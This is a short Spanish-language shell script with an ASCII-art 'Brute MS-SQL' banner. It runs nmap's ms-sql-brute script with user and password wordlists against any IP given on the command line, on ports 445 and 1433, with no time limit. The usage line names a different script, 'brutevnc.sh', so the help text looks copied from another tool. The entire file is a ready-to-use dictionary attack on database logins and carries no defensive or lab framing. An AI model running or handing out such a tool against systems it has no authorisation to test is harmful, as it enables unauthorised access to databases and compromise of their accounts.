...
;M MM M: .M        .MMMMMMMMMMMMMMMMMMMMMMMMMM,         'MM'...'M
 ...
 'MM;MMMMMMMM.MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMM
  ...
  MMM      :M  'MMMMMMMMM Brute MS-SQL MMMMMMM'.MM  MM:M.    'MMMMM
...
if [ -z "$1" ]; then
        echo
        echo "Fuerza bruta con diccionarios a Microsoft SQL en los puertos por defecto 445/TCP  y 1433/TCP."
        echo "Requiere nmap"
        echo "Uso.: sh brutevnc.sh <ip>"
        echo
        exit 0
fi
echo
echo
nmap $1 -p 445 --script ms-sql-brute --script-args mssql.instance-all,userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0
nmap $1 -p 1433 --script ms-sql-brute --script-args userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0
